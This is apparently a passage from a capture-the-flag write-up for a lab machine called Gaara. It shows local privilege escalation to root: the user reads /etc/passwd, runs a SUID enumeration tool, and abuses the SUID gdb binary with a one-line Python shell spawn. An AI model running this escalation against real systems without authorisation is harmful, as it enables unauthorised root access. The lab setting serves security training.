# 3 gaara > root

```
gaara@Gaara:~$ cat /etc/passwd | grep sh
root:x:0:0:root:/root:/bin/bash
gaara:x:1001:1001:,,,:/home/gaara:/bin/bash
```

## SiudEnum

```
[~] Custom SUID Binaries (Interesting Stuff)
------------------------------
/usr/bin/gdb
/usr/bin/gimp-2.10
------------------------------

[#] SUID Binaries in GTFO bins list (Hell Yeah!)
------------------------------
/usr/bin/gdb -~> https://gtfobins.github.io/gtfobins/gdb/#suid
------------------------------

[$] Please try the command(s) below to exploit harmless SUID bin(s) found !!!
------------------------------
[~] /usr/bin/gdb -q -nx -ex 'python import os; os.execl("/bin/sh", "sh", "-p")' -ex quit
------------------------------
```

```
gaara@Gaara:~$ /usr/bin/gdb -q -nx -ex 'python import os; os.execl("/bin/sh", "sh", "-p")' -ex quit
# whoami;id
root
uid=1001(gaara) gid=1001(gaara) euid=0(root) egid=0(root) groups=0(root),1001(gaara)
```
